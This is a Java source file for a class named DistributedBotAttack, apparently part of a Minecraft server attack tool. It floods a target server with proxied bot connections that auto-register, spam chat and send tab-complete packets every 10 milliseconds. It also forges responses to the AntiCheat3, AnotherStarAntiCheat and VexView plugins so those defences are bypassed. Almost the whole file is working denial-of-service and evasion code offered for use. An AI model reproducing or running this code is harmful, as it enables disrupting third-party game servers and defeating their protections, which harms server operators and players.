package luohuayu.EndMinecraftPlus.tasks.attack;

import io.netty.util.internal.ConcurrentSet;
import luohuayu.ACProtocol.AnotherStarAntiCheat;
import luohuayu.ACProtocol.AntiCheat3;
import luohuayu.EndMinecraftPlus.Utils;
import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
import luohuayu.MCForgeProtocol.MCForge;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerMovementPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
import org.spacehq.mc.protocol.packet.ingame.server.entity.player.ServerPlayerPositionRotationPacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.Session;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.packet.Packet;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DistributedBotAttack extends IAttack {
    protected boolean attack_motdbefore;
    protected boolean attack_tab;
    protected Map<String, String> modList;

    private Thread mainThread;
    private Thread tabThread;
    private Thread taskThread;

    public Set<Client> clients = new ConcurrentSet<>();
    public ExecutorService pool = Executors.newCachedThreadPool();

    private static AntiCheat3 ac3 = new AntiCheat3();
    private static AnotherStarAntiCheat asac = new AnotherStarAntiCheat();

    private long starttime;

    public DistributedBotAttack(String ip, int port, int time, int maxconnect, int joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void setBotConfig(boolean motdbefore, boolean tab, Map<String, String> modList) {
        this.attack_motdbefore = motdbefore;
        this.attack_tab = tab;
        this.modList = modList;
    }

    public void start() {
        setTask(() -> {
            while (true) {
                for (Client c : clients) {
                    if (c.getSession().isConnected()) {
                        if (c.getSession().hasFlag("login")) {
                            c.getSession().send(new ClientChatPacket(Utils.getRandomString(1, 4) + "喵喵喵喵喵~"));
                        } else if (c.getSession().hasFlag("join")) {
                            String pwd = Utils.getRandomString(7, 12);
                            c.getSession().send(new ClientChatPacket("/register " + pwd + " " + pwd));
                            c.getSession().setFlag("login", true);
                        }

                    }
                }
                Utils.sleep(5 * 1000);
            }
        });

        this.starttime = System.currentTimeMillis();

        mainThread = new Thread(() -> {
            while (true) {
                try {
                    cleanClients();
                    createClients(ip, port);
                    Utils.sleep(10 * 1000);

                    if (this.attack_time > 0 && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
                        for (Client c : clients) {
                            c.getSession().disconnect("");
                        }
                        stop();
                        return;
                    }
                    Utils.log("BotThread", "连接数:" + clients.size());
                } catch (Exception e) {
                    Utils.log("BotThread", e.getMessage());
                }
            }
        });

        if (this.attack_tab) {
            tabThread = new Thread(() -> {
                while (true) {
                    for (Client c : clients) {
                        if (c.getSession().isConnected() && c.getSession().hasFlag("join")) {
                            MultiVersionPacket.sendTabPacket(c.getSession(), "/");
                        }
                    }
                    Utils.sleep(10);
                }
            });
        }

        mainThread.start();
        if (tabThread != null)
            tabThread.start();
        if (taskThread != null)
            taskThread.start();
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        mainThread.stop();
        if (tabThread != null)
            tabThread.stop();
        if (taskThread != null)
            taskThread.stop();
    }

    public void setTask(Runnable task) {
        taskThread = new Thread(task);
    }

    private void cleanClients() {
        clients.removeIf(c -> !c.getSession().isConnected());
    }

    private void createClients(final String ip, int port) {
        for (String p : ProxyPool.proxys) {
            try {
                String[] _p = p.split(":");
                Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                Client client = createClient(ip, port, Utils.getRandomString(4, 12), proxy);
                client.getSession().setReadTimeout(10 * 1000);
                client.getSession().setWriteTimeout(10 * 1000);
                clients.add(client);

                if (this.attack_motdbefore) {
                    pool.submit(() -> {
                        getMotd(proxy, ip, port);
                        client.getSession().connect(false);
                    });
                } else {
                    client.getSession().connect(false);
                }

                if (this.attack_maxconnect > 0 && (clients.size() > this.attack_maxconnect))
                    return;
                if (this.attack_joinsleep > 0)
                    Utils.sleep(attack_joinsleep);
            } catch (Exception e) {
                Utils.log("BotThread/CreateClients", e.getMessage());
            }
        }
    }

    public Client createClient(final String ip, int port, final String username, Proxy proxy) {
        Client client = new Client(ip, port, new MinecraftProtocol(username), new TcpSessionFactory(proxy));
        new MCForge(client.getSession(), this.modList).init();
        client.getSession().addListener(new SessionListener() {
            public void packetReceived(PacketReceivedEvent e) {
                handlePacket(e.getSession(), e.getPacket(), username);
            }

            public void packetSent(PacketSentEvent e) {
            }

            public void connected(ConnectedEvent e) {
            }

            public void disconnecting(DisconnectingEvent e) {
            }

            public void disconnected(DisconnectedEvent e) {
                String msg;
                msg = e.getCause() != null ? e.getCause().toString() : e.getReason();
                Utils.log("Client", "[断开][" + username + "] " + msg);
            }
        });
        return client;
    }

    public boolean getMotd(Proxy proxy, String ip, int port) {
        try {
            Socket socket = new Socket(proxy);
            socket.connect(new InetSocketAddress(ip, port));
            if (socket.isConnected()) {
                OutputStream out = socket.getOutputStream();
                InputStream in = socket.getInputStream();
                out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
                out.write(new byte[]{0x01, 0x00});
                out.flush();
                in.read();

                try {
                    in.close();
                    out.close();
                    socket.close();
                } catch (Exception e) {
                }

                return true;
            }
            socket.close();
        } catch (Exception e) {
        }
        return false;
    }

    protected void handlePacket(Session session, Packet recvPacket, String username) {
        if (recvPacket instanceof ServerPluginMessagePacket) {
            ServerPluginMessagePacket packet = (ServerPluginMessagePacket) recvPacket;
            switch (packet.getChannel()) {
                case "AntiCheat3.4.3":
                    String code = ac3.uncompress(packet.getData());
                    byte[] checkData = ac3.getCheckData("AntiCheat3.jar", code,
                            new String[]{"44f6bc86a41fa0555784c255e3174260"});
                    session.send(new ClientPluginMessagePacket("AntiCheat3.4.3", checkData));
                    break;
                case "anotherstaranticheat":
                    String salt = asac.decodeSPacket(packet.getData());
                    byte[] data = asac.encodeCPacket(new String[]{"4863f8708f0c24517bb5d108d45f3e15"}, salt);
                    session.send(new ClientPluginMessagePacket("anotherstaranticheat", data));
                    break;
                case "VexView":
                    if (new String(packet.getData()).equals("GET:Verification"))
                        session.send(new ClientPluginMessagePacket("VexView", "Verification:1.8.10".getBytes()));
                    break;
                default:
            }
        } else if (recvPacket instanceof ServerJoinGamePacket) {
            session.setFlag("join", true);
            Utils.log("Client", "[连接成功][" + username + "]");
            MultiVersionPacket.sendClientSettingPacket(session, "zh_CN");
            MultiVersionPacket.sendClientPlayerChangeHeldItemPacket(session, 1);
        } else if (recvPacket instanceof ServerPlayerPositionRotationPacket) {
            ServerPlayerPositionRotationPacket packet = (ServerPlayerPositionRotationPacket) recvPacket;
            MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
            session.send(new ClientPlayerMovementPacket(true));
            MultiVersionPacket.sendClientTeleportConfirmPacket(session, packet);
        }
    }
}
